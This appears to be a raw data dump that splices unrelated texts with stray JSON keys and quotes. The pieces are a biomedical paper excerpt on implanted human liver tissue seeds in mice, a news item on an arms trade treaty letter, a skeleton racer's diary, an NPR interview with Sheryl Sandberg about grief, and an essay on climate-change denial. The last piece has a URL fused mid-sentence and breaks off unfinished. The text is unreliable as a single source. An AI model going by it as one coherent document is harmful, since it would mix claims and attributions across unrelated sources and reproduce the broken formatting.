endothelial cord structures (1) from human umbilical vein endothelial cells (HUVECs) (Fig. 1B). This fabrication process was adaptable for scaled construction of larger tissues using a bioprinting process that we developed previously (fig. S1) (4). Finally, we coencapsulated the hepatic cellular aggregates with the endothelial cell cords in a fibrin hydrogel to create tissue seeds that were suitable for ectopic implantation in the intraperitoneal mesenteric fat of mice (Fig. 1B). Fig. 1. Construction of human liver seed grafts. (A) Human hepatic aggregates containing human primary hepatocytes and NHDFs were created using pyramidal microwells. (B) Hepatic aggregates (red) were then combined with geometrically patterned human endothelial cell cords (green) in a fibrin hydrogel to create “liver tissue seeds” that were then implanted ectopically into FNRG mice. Right: Blue-gloved finger demonstrates macroscopic scale of human liver tissue seeds. (C) Human albumin production by human hepatocytes was enhanced sixfold in liver seed grafts containing both hepatocytes (Hep) and NHDFs compared to seed grafts containing only hepatocytes after culture in vitro for 6 days (***P < 0.0001). (D) Albumin promoter activity was enhanced in implanted liver seed grafts composed of human hepatocytes and NHDFs compared to those containing only human hepatocytes, 6 days after implantation into FNRG mice (**P < 0.01). ROI, region of interest. Scale bars, 400 μm. As an initial characterization step, short-term in vitro tests showed that the addition of NHDFs to hepatocyte aggregates enhanced sixfold the production of human albumin, a measure of hepatic function, in a dose-dependent manner compared to aggregates containing only hepatocytes before encapsulation with endothelial cords (Fig. 1C and fig. S2). Similarly, the albumin promoter activity (21) of tissue seeds containing aggregates of both hepatocytes and NHDFs was enhanced more than eightfold compared to seeds containing hepatocyte-only aggregates 6 days after implantation into the mesenteric fat of healthy nude mice (Fig. 1D). Thus, the combination of human hepatocytes, endothelial cells, and stromal cells yielded candidate human liver tissue seeds that could survive engraftment in vivo.\n\nExpansion of human hepatocytes in ectopic implants after liver injury in host mice We hypothesized that inducing host soluble regenerative signals in mice receiving ectopic implants of liver tissue seeds might trigger these seeds to grow. Accordingly, we implanted human liver tissue seeds into the mesenteric fat of FNRG mice, an immunodeficient mouse model of the liver disease hereditary tyrosinemia type I. FNRG mice were generated by backcrossing fumarylacetoacetate hydrolase–deficient (Fah−/−) mice with nonobese diabetic (NOD) mice, recombinase activating gene–deficient (Rag1−/−) mice, and interleukin-2 receptor γ chain–deficient (Il2rγ-null) mice (13, 24, 25). This mouse strain experiences progressive liver failure unless treated with the small molecule 2-(2-nitro-4-fluoromethylbenzoyl)-1,3-cyclohexanedione (NTBC). NTBC was administered continuously to FNRG mice in the control group (Fig. 2A) or was given intermittently to induce cycles of liver injury and regeneration. Animals were sacrificed, and grafts were retrieved at 80 days after tissue seed implantation. Grafts were located in the mesenteric fat pad using the suture as a landmark. Fig. 2. Human liver tissue seed grafts expand after host liver injury. (A) Human liver tissue seed grafts were implanted onto the mesenteric fat of FNRG mice. The mice were treated intermittently with the small molecule NTBC to induce liver injury and regeneration or received NTBC continuously and remained injury free. (B) Immunostaining of liver tissue seed grafts explanted 80 days after implantation showed positive staining for the markers cytokeratin-18 and arginase-1 in animals with and without liver injury. Scale bars, 100 μm. (C) Histomorphometry revealed greater cytokeratin-18–positive graft area and volume in animals with liver injury compared to controls. (D) Many Ki67 and cytokeratin-18 double-positive cells were observed in the liver seed grafts from mice with liver injury (left, white arrows); rare Ki67 and cytokeratin-18 double-positive cells undergoing mitosis were also observed (right, white arrows). Graph shows that liver seed grafts in animals with liver injury exhibited a greater number of Ki67 and cytokeratin-18 double-positive cells compared to uninjured animals. Scale bars, 10 μm. *P < 0.05, **P < 0.01 (Student’s t test). To determine whether ectopic liver tissue seeds had expanded in animals in response to chronic injury and regeneration cycles induced by intermittent NTBC dosing compared to control animals, we identified human hepatocytes by immunostaining for human cytokeratin-18, an intermediate filament expressed by hepatocytes, and arginase-1, an enzyme that catalyzes the hydrolysis of arginine to ornithine and urea (26, 27). Grafts from control animals treated continuously with NTBC had small cellular aggregates containing cytokeratin-18– and arginase-1–positive cells dispersed within the hydrogel (Fig. 2B, left). In animals that underwent cycles of injury and regeneration caused by intermittent treatment with NTBC, larger hepatic grafts composed of densely packed cytokeratin-18– and arginase-1–positive cells were observed (Fig. 2B, right). The cytokeratin-18–positive surface area in tissue seed grafts was quantified by a blinded observer using morphometric analysis in histologic sections. Hepatic tissue seed grafts covered significantly more surface area in FNRG animals with intermittent NTBC treatment compared to control animals (Fig. 2C, top; P < 0.01). Assuming that the grafts were spherical, we extrapolated graft volume on the basis of surface area measurements and calculated an average 11-fold graft expansion in NTBC-treated animals compared to control animals without liver injury (Fig. 2C, bottom; P < 0.05). To assay for active proliferation in tissue seeds 80 days after implantation, we double-stained sections using antibodies against both cytokeratin-18 and Ki67, a nuclear protein associated with cellular proliferation. We identified numerous cytokeratin-18 and Ki67 double-positive cells with round nuclei characteristic of hepatocytes (Fig. 2D, left), as well as rare double-positive cells actively undergoing mitosis (Fig. 2D, right). When compared with control animals, fourfold more cytokeratin-18 and Ki67 double-positive cells were observed in grafts from animals that received cycles of NTBC to induce liver injury and regeneration (Fig. 2D, graph; P < 0.01). To test whether our candidate tissue seeds also responded to regenerative cues after acute liver injury, we implanted seed grafts into the mesenteric fat of athymic mice. After a 1-week engraftment period, mice were subjected to two-thirds partial hepatectomy of the host liver to promote liver regeneration and given 5-ethynyl-2′-deoxyuridine (EdU) every 12 hours to label cells in the S phase of the cell cycle. One week after hepatectomy, animals were sacrificed, and engrafted tissues were excised, sectioned, and double-immunostained using antibodies that recognized EdU and cytokeratin-18 to identify hepatocytes in the S phase of the cell cycle. Grafts subjected to regenerative signals induced by hepatectomy injury contained more EdU and cytokeratin-18 double-positive cells compared to controls (fig. S3).\n\nHepatic function of ectopic liver seed grafts To evaluate the functional characteristics of the expanded hepatic seed grafts, we studied two major axes of liver function: synthesis and drug metabolism, and also performed a more global analysis of liver seed graft phenotypes. We first measured the protein synthesis capacity of the grafts by testing for human proteins in mouse serum. We detected human albumin in serum from engrafted mice treated with NTBC as early as day 3; the concentration of human albumin increased 50-fold from day 3 to the end point of the experiment in the NTBC-treated animals (Fig. 3, A and B). The maximum human albumin concentration detected in a single animal undergoing cycles of liver injury and regeneration was 105 μg/ml. Human serum albumin concentrations began to diverge between the treatment groups at about day 20, and liver seed grafts in animals with liver injury produced more albumin than those in control animals (Fig. 3, A and B; 10-fold difference at the end point of the experiment; P < 0.001). In addition to human albumin, blood drawn from NTBC-treated animals showed increased concentrations of human transferrin, α1-antitrypsin, and fibronectin relative to controls (Fig. 3C; P < 0.05). These results suggested that human hepatocytes in ectopic tissue seed grafts were functional and synthesized more human proteins when in the presence of regenerative signals induced by liver injury, compared to uninjured control animals. Fig. 3. Human liver tissue seed graft function. Mice were implanted with liver seed grafts, and the host mice were treated intermittently with NTBC to induce liver injury and repair (14 days off, followed by 3 to 4 days on; gray bars). (A) Blood samples were collected weekly by retro-orbital bleeding. The concentration of human albumin in mouse serum was greater in animals with liver injury compared to controls [P < 0.0001, one-way analysis of variance (ANOVA)]. (B) Human albumin concentration for each animal averaged across all time points. (C) The concentrations of human transferrin, α1-antitrypsin, and fibronectin in mouse serum were greater in animals receiving intermittent NTBC treatment (liver injury) compared to controls at 80 days after implantation into FNRG mice. (D) mRNA expression analysis of explanted liver seed grafts demonstrated that 47 of 50 liver-specific genes were expressed in explanted liver seed grafts (denoted “Seed graft”) compared to 18 of 50 human genes expressed in HUVEC and NHDF cell lines. (E and F) Genes from each of the major hepatic drug metabolism pathways were expressed in liver seed grafts at levels similar to those of the human liver. (G and H) Mice with liver seed grafts were injected with rifampin solution (25 mg/kg, intraperitoneally) or vehicle control daily for 3 days and, again, 1 hour before sacrifice. (I) Rifampin induced greater CYP3A4 expression in expanded liver seed grafts compared to mice injected with vehicle control. *P < 0.05, ***P < 0.001 (Student’s t test). To gauge the potential utility of liver seed grafts for studies of drug metabolism, we characterized the expression and induction of human drug-metabolizing enzymes and other key liver-specific proteins in expanded grafts implanted into FNRG mice. We first collected RNA for RNA sequencing (RNA-seq) analysis from liver seed grafts explanted from injured host mice, as well as from control samples comprising healthy human liver, primary human hepatocytes, HUVECs, and NHDFs. We then looked at the expression of 50 genes representing different hepatic gene classes that were expressed in both control human liver and primary human hepatocyte RNA samples. These gene groups included CYP3A4 and CYP2B6 for cytochrome P450 activity, SULT1A1/2A1 for sulfotransferase activity, SLCO1A2/1B1 for anion transporter activity, ABCB/ABCG for adenosine 5′-triphosphate (ATP)–binding transporters, APOB/APOE for lipoprotein biosynthesis, albumin for biosynthesis, and HNF4A/G encoding key transcription factors. Read counts across groups were normalized to human primary hepatocyte control RNA samples to create an expression heat map (Fig. 3D). A total of 47 of 50 of these liver-specific genes were expressed in explanted liver seed grafts, compared to 18 of 50 genes expressed in unexpanded HUVEC and NHDF RNA samples. Genes from each of the major hepatic drug metabolism pathways were expressed in liver seed grafts at similar levels to the human liver, including cytochrome P450 enzymes (Fig. 3E), sulfotransferases (Fig. 3F), and anion transporters and ATP-binding transporters (Fig. 3, G and H). In addition to hepatic gene expression studies, we tested the ability of liver seed grafts to up-regulate key drug metabolism enzymes in response to a known human CYP450 inducer (21). We administered rifampin or vehicle control to FNRG animals treated with NTBC bearing expanded liver seed grafts, euthanized the animals, and collected RNA from explanted liver seed grafts. We found that rifampin induced CYP3A4 expression in liver seed grafts, a highly liver-specific phenomenon indicative of mature hepatocyte function (Fig. 3I). Finally, we sought to interrogate the transcriptional profile of liver seed grafts more globally. We first used Ingenuity Pathway Analysis to assess the fraction of genes known to be downstream of given transcription factors that were differentially regulated between expanded liver seed grafts and HUVEC or NHDF control cells. This analysis identified distinct transcriptional regulation in liver seed grafts by hepatocyte transcription factors in the HNF1, HNF3, and HNF4 families, as well as C/EBP (CCAAT/enhancer-binding protein), compared to HUVEC or NHDF control cells (fig. S4A). This suggested that the hepatocytes present in expanded liver seed grafts displayed a lineage-appropriate phenotype. Furthermore, given that liver seed grafts were composed of primary hepatocytes, HUVECs, and NHDFs, we sought to test whether expression profiles from each of these three cell types were detectable in liver seed grafts after expansion. Hierarchical clustering of expression RNA-seq profiles obtained from samples of expanded liver seed grafts, pure human primary hepatocytes, human liver tissue, and pure populations of cultured NHDFs and HUVECs demonstrated that RNA expression in liver seed grafts clustered between those of primary hepatocytes/human liver samples and those of nonparenchymal HUVEC and NHDF cell lines. This was consistent with an intermediate phenotype driven by the presence of each of these three cell types within the expanded graft (fig. S4B).\n\nCharacterization of liver seed graft morphology after transplant Our earlier-generation engineered tissues, when implanted into uninjured mouse hosts, were characterized histologically by the presence of disperse hepatic aggregates within fibrin hydrogels upon explant (1, 2, 21). Here, we hypothesized that cells would self-organize in response to regenerative stimuli as the tissue seeds expanded. Immunohistological characterization revealed that the expanded liver seed grafts in NTBC-treated FNRG mice contained densely packed polyhedral cells resembling hepatocytes, many of which were binucleated (Fig. 4A; staining with hematoxylin and eosin). These cells stained positively for the hepatocyte markers cytokeratin-18 and arginase-1 (Fig. 4, B and C). Hepatocytes in expanded liver seed grafts were organized into dense aggregate-like units that, in some cases, exhibited structures reminiscent of hepatic cords in the normal human liver (Fig. 4B). Furthermore, hepatic units in expanded liver seed grafts were arranged within a syncytium of interconnected lacunae containing endovascular stroma and lined with collagen III, which lines hepatic cords in the space of Disse in the human liver (Fig. 4D, staining for reticulin). In addition, liver seed grafts were examined for the expression of multidrug resistance–associated protein 2 (MRP2; also known as ABCC2), which is selectively transported to the apical (that is, canalicular) domain of hepatocytes in the human liver. We observed that hepatocytes in expanded liver seed grafts exhibited polarized expression of MRP2 (Fig. 4C). Tissue seed grafts also contained bile canalicular–like structures between adjacent hepatocytes characteristic of normal liver structure (Fig. 4C), as well as larger vacuolar structures expressing MRP2 (Fig. 4C). Fig. 4. Characterization of human liver seed graft morphology. (A) Immunohistochemical staining of human liver tissue seed grafts from animals with liver injury sacrificed at day 80 revealed densely packed polyhedral cells resembling hepatocytes [stained with hematoxylin and eosin (H&E)] that were positive for both arginase-1 (B) and cytokeratin-18 (C). These human hepatocytes sometimes self-organized into cord-like structures (white star) (B). Hepatocytes were polarized, forming MRP2-positive bile canalicular–like structures between hepatocytes (white arrows, inset) and larger vacuoles lined with MRP2 (white stars) (C). (D) Hepatic units within the human liver seed grafts were surrounded by a syncytium of interconnected lacunae lined with collagen III as indicated by reticulin staining. (E) Human liver tissue seed graft sections stained with hematoxylin and eosin contained duct-like structures that resembled bile ducts (black arrows). (F) Cells in the ductal structures present in expanded liver seed grafts stained positive for cytokeratin-19, which is a marker for biliary epithelial cells but does not stain human hepatocytes (left). Cells organized in ductal structures stained positively for both cytokeratin-18 and cytokeratin-19 (white arrows, inset) (middle). Ductal structures were typically located adjacent to blood vessels lined with human CD31–positive endothelial cells and containing Ter-119–positive red blood cells (right). Scale bars, 25 μm. Further characterization with hematoxylin and eosin staining revealed that expanded tissue seed grafts also contained duct-like structures resembling bile ducts (Fig. 4E, arrows). To further examine whether biliary epithelial–like cells were present in ectopic grafted tissues, we immunohistochemically stained tissue sections for expression of both cytokeratin-18 (a cytokeratin expressed by hepatocytes and biliary epithelial cells) and cytokeratin-19 (a cytokeratin expressed by biliary epithelial cells but not hepatocytes). Cells organized in ductal structures stained positively for both cytokeratin-18 and cytokeratin-19, suggesting that these cells exhibited biliary epithelial–like characteristics (Fig. 4F). Notably, cytokeratin-18 and cytokeratin-19 double-positive ductal structures were typically located within connective tissue and adjacent to human CD31–positive blood vessels, many of which contained Ter-119–positive erythroid cells (Fig. 4F). To further confirm both the biliary epithelial cell–like phenotype and whether these cells were of human origin, we stained tissue sections for human cytokeratin-18 and a second cytokeratin expressed on biliary epithelial cells but not hepatocytes, human cytokeratin-7. Ungrafted mouse control liver tissue did not stain with either human marker, whereas positive control human liver tissue contained cytokeratin-18 and cytokeratin-7 double-positive cells in ductal structures (fig. S5). Ductal structures in ectopic liver seed grafts stained positive for both cytokeratin-18 and cytokeratin-7, further confirming that they were composed of human cells with an epithelial cell phenotype (fig. S5). We hypothesized that biliary epithelial–like cells identified in liver seed grafts may have arisen at least partially from contaminating biliary epithelial cells present in cryopreserved human hepatocyte samples. To test this hypothesis, we immunostained for cytokeratin-19 expression using cells from primary hepatocyte samples immediately upon thawing. We identified cytokeratin-19–positive cells in both of the human hepatocyte primary cell samples used in this study (0.16 and 0.13% of total cells in hu8085 and NON sample lots, respectively; fig. S6), suggesting that self-assembling biliary-like structures may have been at least partially derived from these cells. These results suggested that human biliary epithelial–like cells self-assembled to form ductal-like structures at an ectopic location within human liver tissue seeds and that these ductal structures were associated with other classic features of portal triads, such as vasculature and connective tissue.\n\nConcomitant expansion of blood vessels lined with human endothelial cells Given that lacunae in the human liver form the vascular sinusoidal network that feeds hepatocytes with blood, we wondered whether interconnected lacunae observed in hepatic liver seed grafts contained red blood cells and whether regenerative cues would promote expansion of the total blood in the liver seed graft. We observed numerous cells resembling red blood cells in the lacunae of expanded seed grafts by hematoxylin and eosin staining (Fig. 4A). We further confirmed the identity of such cells by staining for Ter-119, an erythrocyte marker (Fig. 5A). We also quantified total blood area and observed that liver seed grafts from animals subjected to cycles of liver injury and regeneration contained significantly more red blood cells compared to those from control animals (Fig. 5A; P < 0.05), suggesting that the blood pool coordinately expanded with the expansion of hepatic seed grafts in animals with liver injury. Fig. 5. Vascularization of human liver seed grafts. (A) Lacunae between hepatocytes (red) contained Ter-119–positive red blood cells in liver seed grafts in animals with liver injury (left, green). Graph shows that liver seed grafts in animals with NTBC-induced liver injury and regeneration contained a greater number of red blood cells than did those in control animals. (B) Blood vessels containing Ter-119–positive red blood cells (white) and lined in part by human endothelial cells (red) were identified in tissue seed grafts (left). Liver seed grafts from animals with liver injury contained more human CD31 (huCD31)–positive blood vessels compared to grafts in control mice (right). Scale bars, 25 μm. *P < 0.05, ***P < 0.001 (Student’s t test). The presence of red blood cells in expanded tissue seed grafts suggested that vascular networks might be present in these grafts. Furthermore, several existing ectopic engraftment models have been shown to recruit host-derived vascular components, and human hepatocytes and vascular cells are known to expand in concert during liver regeneration (6, 28, 29). These observations led us to hypothesize that the prepatterned human endothelial cells within hepatic seed grafts may also expand in response to regenerative cues after liver injury. Thus, we immunostained expanded liver seed graft sections with antibodies recognizing human CD31 (endothelial cells), Ter-119, and arginase-1. Vessels lined in part by human endothelial cells were identified throughout the liver seed grafts that had expanded in FNRG mice treated with cycles of NTBC (Fig. 5B). Incubation of explanted graft sections in a solution containing lectins that bound specifically to human or mouse endothelium demonstrated that vessels were lined with both human and mouse endothelial cells (fig. S7). Many of these vessels contained Ter-119–positive erythroid cells (Fig. 5B). Blood vessels lined with CD31-positive human endothelial cells were located in the lacunae between and within hepatic units (Fig. 5B). Liver seed grafts in mouse hosts with liver injury showed more vessels containing human endothelial cells compared to liver seed grafts in control animals (Fig. 5B; P < 0.01). Ki67-positive human endothelial cells were present but were rare (less than one Ki67-positive and human CD31–positive cell per 1-mm section of liver seed graft). This suggested that most endothelial cells were not undergoing active cell cycle progression at the time of graft explant (fig. S8).",

  "latent_29819": "Some 130 lawmakers sent President Obama a letter on Monday expressing their opposition to a pending arms trade treaty if it impinges on gun rights and U.S. sovereignty in any way.\n\nThe United Nations this week begins a month-long process of crafting a long-delayed treaty to create international standards for importing and exporting conventional weapons. Proponents say the treaty would bring much of the rest of the world in line with U.S. standards without affecting domestic sales, but gun enthusiasts are worried.\n\nADVERTISEMENT\n\n“The UN's actions to date indicate that the ATT [United Nations Arms Trade Treaty] is likely to pose significant threats to our national security, foreign policy, and economic interests as well as our constitutional rights,” reads the letter, which was spearheaded by Rep. Mike Kelly (R-Pa.). “The U.S. must establish firm red lines for the ATT and state unequivocally that it will oppose the ATT if it infringes on our rights or threatens our ability to defend our interests.”\n\nSpecifically, the letter demands that the treaty exclude small arms and ammunition and recognize an individual right to personal self-defense.\n\nTreaty champions say the absence of rules for international arms transfers puts U.S. troops at risk and U.S. arms exporters at a disadvantage, while allowing rogue arms dealers to ignore U.S.-backed sanctions by hiding in countries with little or no legal authority over arms sales. They add that small arms are responsible for most civilian deaths in conflicts around the world, and should be covered along with ammunition for the treaty to be of use.\n\n“What happens is arms dealers ... can hang out and do their operations in countries with weak laws and continue to trade with sanctioned countries or terrorists with impunity,” Scott Stedjan, a senior policy adviser to Oxfam America, told The Hill last month.\n\n“The U.S. standard would be so much higher that it would have no impact on U.S. laws. That's where I disagree with people who claim it would violate the 2nd Amendment,” he said.\n\nThe National Rifle Association for its part applauded the letter.\n\n“Any international Arms Trade Treaty (ATT) that in any way, shape or form affects the constitutional rights of American gun owners is unacceptable,” Chris Cox, execuctive director of the NRA's Institute for Legislative Action, said in a statement. “International organizations and foreign governments do not have the right to restrict the fundamental freedoms handed down to us from our Founding Fathers.”",

There are always small teething issues when everything's new as you might expect, but the organisers are helpful and doing their best to put on a great event.\n\nThe track is unique, with corner trajectories that have never been seen before, a long push start and technical questions all the way down.\n\nThere's no kreisel here (a 360 degree corner), but plenty of other challenges from the moment you jump on the sled to the finish line.\n\nThe longer your career as a slider, the fewer times you get to experience sliding a new track for the first time as they are only now built at new Olympic venues once every four years.\n\nObviously learning new tracks is a fairly common occurrence as a beginner when you first start competing and travelling, and at that time feeling out of your comfort zone almost becomes second nature as brand new scenarios are thrown at you constantly.\n\nLaura Deas won World Cup gold in the opening race of the 2015-16 season.\n\nWhat makes this trip so unusual is that everyone on the international tour is experiencing being presented with a new track at the same time, so it's fascinating to see how people and teams approach getting to know it and getting over those fears of being at the start of a learning curve again.\n\nI'm loving having a completely fresh challenge after a long, tough season of competing, and it's reminding me why I love the sport.\n\nWe came straight to Pyeongchang from the World Championships in Konigssee, Germany.\n\nI left with real mixed feelings of how it had gone.

The Facebook senior executive and mother of two had a best-selling book (Lean In: Women, Work and the Will to Lead) and she and her husband, Dave Goldberg, decided to take a vacation. But on that vacation, Goldberg collapsed at the gym from heart failure and died. He was 47 years old.\n\nSandberg went through a period of darkness after her husband's death. She turned to professionals and friends for help getting through it, and now she's written a book with one of those professionals, psychologist Adam Grant. It's called Option B: Facing Adversity, Building Resilience and Finding Joy.\n\nOption B Facing Adversity, Building Resilience, and Finding Joy by Sheryl Sandberg and Adam Grant Hardcover, 226 pages | purchase close overlay Buy Featured Book Your purchase helps support NPR programming. How?\n\nSandberg spoke to NPR about finding her way back to normal and the best way to be there for someone who's going through a hard time.\n\nInterview Highlights\n\nOn how the people around her reacted to her loss\n\nMy interactions before — I would drop my kids off at school and, you know, the parents and I would all wave to each other; show up at work and everyone would chit chat. A lot of that just stopped and people kind of looked at me like I was a ghost. And I think they were so afraid of saying the wrong thing that they hardly said anything at all.\n\nAnd it's not just death which does this, it's really all forms of adversity. You want to silence a room? Get diagnosed with cancer. You know, have someone in your family go to prison. Lose a job. Sexual assault. These things are uncomfortable, and because they're uncomfortable people are often afraid of saying the wrong thing and often say nothing at all, and then we have this huge elephant in a room following us around. And one of the reasons I wrote the book and am launching OptionB.org is that the problem with that is that we then don't help each other when we most need that help, and I think that's when we can most come together.\n\nOn the best way to be there someone who's going through a hard time\n\nI used to say, when someone was going through something hard, \"Is there anything I can do?\" And I meant it, I meant it kindly. But the problem is ... that kind of shifts the burden to the person you're offering the help to to figure out what they need. And when I was on the other side of that question, I didn't know how to answer it. Is there anything you can do? Well, can you make Father's Day go away so I don't have to live through it every year? No.\n\nEnlarge this image toggle caption Scott Olson/Getty Images Scott Olson/Getty Images\n\nRather than offer to do something, it's often better to do anything. Just do something specific. My wonderful friends ... tragically lost a son and they spent many months in a hospital before that. And one of his friends texted him and said, \"What do you not want on a burger?\" Not, \"Do you want dinner?\" Another friend texted and said, \"I'm in the lobby of your hospital for an hour for a hug whether you come down or not.\" Just show up.\n\nNow, there's no one way to grieve and not everyone will want the same thing. So the best approach is really ask people. Say, \"I know you're going through something terrible. I'm coming over with dinner tonight. Is that OK?\"\n\nOn how to build resilience\n\nThe most important thing you can do to build resilience is find gratitude. And it's completely counter intuitive, right? I lost my husband and I would have thought that what you want to do in that situation is try to come up with any positive thought you can. But one day [Option B co-author Adam Grant] said to me, \"You should think about how things could be worse.\" And I looked at him like he was crazy. I'm like, \"Worse? Well? Are you kidding?\" And he said, \"Dave could have had that same cardiac arrhythmia driving your children.\" Right? I mean sock it to the gut. Never occurred to me I could have lost all three. And the second you say that, you're \"I'm good. My kids are alive.\"\n\nOn how losing her husband made her rethink some of the things she wrote about in 2013's Lean In\n\nI think in some ways I didn't get it. When I wrote Lean In, I certainly thought about single mothers and single parents, and I wrote about that in the book. But I also titled a whole chapter \"Make Your Partner a Real Partner.\" And it wasn't until I lost Dave that I really understood how hard that could be for someone who didn't have one, the same way Father's Day is so hard for us now. ...\n\nAnd I posted this last Mother's Day and said I don't think I understood this deeply enough. And I really believe we need to do better. ... Resilience is needed by everyone and hardship is not evenly distributed. People who are living with disadvantage and living in poverty face more to overcome and have fewer resources with which to overcome and we need to change both of those.\n\nOn giving herself permission to be happy after her husband died\n\nAbout four months after Dave died, I went to a friend's child's bar mitzvah and I got on the dance floor with an old high school friend and danced to a song I love. And then a minute in, I just started crying. A lot. On the dance floor. He had to kind of take me outside. And I didn't really know what was wrong, and then I realized I felt OK. For one minute. I danced and felt happy for a minute, and then immediately the guilt just flooded into my body. How can I feel OK when Dave is gone? And what I realized is that it's not just overcoming the grief and it's not just overcoming the isolation; it's giving ourselves permission to feel happy.\n\nMy brother-in-law, Dave's only sibling, did this for me in such a beautiful way. He called me one day and he was crying, I could hear it in his voice. And he said, \"All Dave ever wanted was for you and your children to be happy. Don't take that away from him in death.\" And it still was hard to let myself laugh, to let myself find joy, but I realized I had to work at it. I had to give myself permission. And I knew I needed to do it because everyone said if I didn't find a way to be happy my kids could never be happy. ...\n\nOne of the suggestions Adam made to me is write down three moments of joy before you go to bed. And it's the New Year's resolution I've kept by far the longest. ... The thing about happiness is I think sometimes we're waiting for the big stuff to be happy. ... But happiness isn't always the big things. Happiness is actually the little things, the little moments that make up our day. And in the face of Dave's death, the big thing was not getting better, and it's still not better. So if I wait for that to get better to feel any happiness I'm never gonna feel it.\n\nRadio producer Selena Simmons-Duffin, radio editor Jeffrey Katz and digital producer Nicole Cohen contributed to this story.",
  "latent_30318": "It’s been a tough few weeks for the forces of climate-change denial.\n\nFirst came the giant billboard with Unabomber Ted Kacynzki’s face plastered across it: “I Still Believe in Global Warming. Do You?” Sponsored by the Heartland Institute, the nerve-center of climate-change denial, it was supposed to draw attention to the fact that “the most prominent advocates of global warming aren’t scientists. They are murderers, tyrants, and madmen.” Instead it drew attention to the fact that these guys had over-reached, and with predictable consequences.\n\nA hard-hitting campaign from a new group called Forecast the Facts persuaded many of the corporations backing Heartland to withdraw $825,000 in funding; an entire wing of the Institute, devoted to helping the insurance industry, calved off to form its own nonprofit. Normally friendly politicians like Wisconsin Republican Congressman Jim Sensenbrenner announced that they would boycott the group’s annual conference unless the billboard campaign was ended.\n\nWhich it was, before the billboards with Charles Manson and Osama bin Laden could be unveiled, but not before the damage was done: Sensenbrenner spoke at last month’s conclave, but attendance was way down at the annual gathering, and Heartland leaders announced that there were no plans for another of the yearly fests. Heartland’s head, Joe Bast, complained that his side had been subjected to the most “uncivil name-calling and disparagement you can possibly imagine from climate alarmists,” which was both a little rich — after all, he was the guy with the mass-murderer billboards — but also a little pathetic. A whimper had replaced the characteristically confident snarl of the American right.\n\nThat pugnaciousness may return: Mr. Bast said last week that he was finding new corporate sponsors, that he was building a new small-donor base that was “Greenpeace-proof,” and that in any event the billboard had been a fine idea anyway because it had “generated more than $5 million in earned media so far.” (That’s a bit like saying that for a successful White House bid John Edwards should have had more mistresses and babies because look at all the publicity!) Whatever the final outcome, it’s worth noting that, in a larger sense, Bast is correct: this tiny collection of deniers has actually been incredibly effective over the past years.\n\nThe best of them — and that would be Marc Morano, proprietor of the website Climate Depot, and Anthony Watts, of the website Watts Up With That — have fought with remarkable tenacity to stall and delay the inevitable recognition that we’re in serious trouble. They’ve never had much to work with. Only one even remotely serious scientist remains in the denialist camp. That’s MIT’s Richard Lindzen, who has been arguing for years that while global warming is real it won’t be as severe as almost all his colleagues believe. But as a long article in the New York Times detailed last month, the credibility of that sole dissenter is basically shot. Even the peer reviewers he approved for his last paper told the National Academy of Sciences that it didn’t merit publication. (It ended up in a “little-known Korean journal.”)\n\nDeprived of actual publishing scientists to work with, they’ve relied on a small troupe of vaudeville performers, featuring them endlessly on their websites. Lord Christopher Monckton, for instance, an English peer (who has been officially warned by the House of Lords to stop saying he’s a member) began his speech at Heartland’s annual conference by boasting that he had “no scientific qualification” to challenge the science of climate change.\n\nHe’s proved the truth of that claim many times, beginning in his pre-climate-change career when he explained to readers of the American Spectator that \"there is only one way to stop AIDS. That is to screen the entire population regularly and to quarantine all carriers of the disease for life.” His personal contribution to the genre of climate-change mass-murderer analogies has been to explain that a group of young climate-change activists who tried to take over a stage where he was speaking were “Hitler Youth.”\n\nOr consider Lubos Motl, a Czech theoretical physicist who has never published on climate change but nonetheless keeps up a steady stream of web assaults on scientists he calls “fringe kibitzers who want to become universal dictators” who should “be thinking how to undo your inexcusable behavior so that you will spend as little time in prison as possible.” On the crazed killer front, Motl said that, while he supported many of Norwegian gunman Anders Breivik’s ideas, it was hard to justify gunning down all those children — still, it did demonstrate that “right-wing people... may even be more efficient while killing — and the probable reason is that Breivik may have a higher IQ than your garden variety left-wing or Islamic terrorist.”\n\nIf your urge is to laugh at this kind of clown show, the joke’s on you — because it’s worked. I mean, James Inhofe, the Oklahoma Republican who has emerged victorious in every Senate fight on climate change, cites Motl regularly; Monckton has testified four times before the U.S. Congress.\n\nMorano, one of the most skilled political operatives of the age — he “broke the story” that became the Swiftboat attack on John Kerry — plays rough: he regularly publishes the email addresses of those he pillories, for instance, so his readers can pile on the abuse. But he plays smart, too. He’s a favorite of Fox News and of Rush Limbaugh, and he and his colleagues have used those platforms to make it anathema for any Republican politician to publicly express a belief in the reality of climate change.\n\nTake Newt Gingrich, for instance. Only four years ago he was willing to sit on a love seat with Nancy Pelosi and film a commercial for a campaign headed by Al Gore. In it he explained that he agreed with the California Congresswoman and then-Speaker of the House that the time had come for action on climate. This fall, hounded by Morano, he was forced to recant again and again. His dalliance with the truth about carbon dioxide hurt him more among the Republican faithful than any other single “failing.” Even Mitt Romney, who as governor of Massachusetts actually took some action on global warming, has now been reduced to claiming that scientists may tell us “in fifty years” if we have anything to fear.\n\nIn other words, a small cadre of fervent climate-change deniers took control of the Republican party on the issue. This, in turn, has meant control of Congress, and since the president can’t sign a treaty by himself, it’s effectively meant stifling any significant international progress on global warming. Put another way, the various right wing billionaires and energy companieshttp://www.sourcewatch.org/index.ph... who have bankrolled this stuff have gotten their money’s worth many times over.\n\nOne reason the denialists’ campaign has been so successful, of course, is that they’ve also managed to intimidate the other side. There aren’t many senators who rise with the passion or frequency of James Inhofe but to warn of the dangers of ignoring what’s really happening on our embattled planet.\n\nIt’s a striking barometer of intimidation that Barack Obama, who has a clear enough understanding of climate change and its dangers, has barely mentioned the subject for four years. He did show a little leg to his liberal base in Rolling Stone earlier this spring by hinting that climate change could become a campaign issue. Last week, however, he passed on his best chance to make good on that promise when he gave a long speech on energy at an Iowa wind turbine factory without even mentioning global warming. Because the GOP has been so unreasonable, the President clearly feels he can take the environmental vote by staying silent, which means the odds that he’ll do anything dramatic in the next four years grow steadily smaller.\n\nOn the brighter side, not everyone has been intimidated. In fact, a spirited counter-movement has arisen in recent years. The very same weekend that Heartland tried to put the Unabomber’s face on global warming, 350.org conducted thousands of rallies around the globe to show who climate change really affects. In a year of mobilization, we also managed to block — at least temporarily — the Keystone pipeline that would have brought the dirtiest of dirty energy, tar-sands oil, from the Canadian province of Alberta to the Gulf Coast. In the meantime, our Canadian allies are fighting hard to block a similar pipeline that would bring those tar sands to the Pacific for export.\n\nSimilarly, in just the last few weeks, hundreds of thousands have signed on to demand an end to fossil-fuel subsidies. And new polling data already show more Americans worried about our changing climate, because they’ve noticed the freakish weather of the last 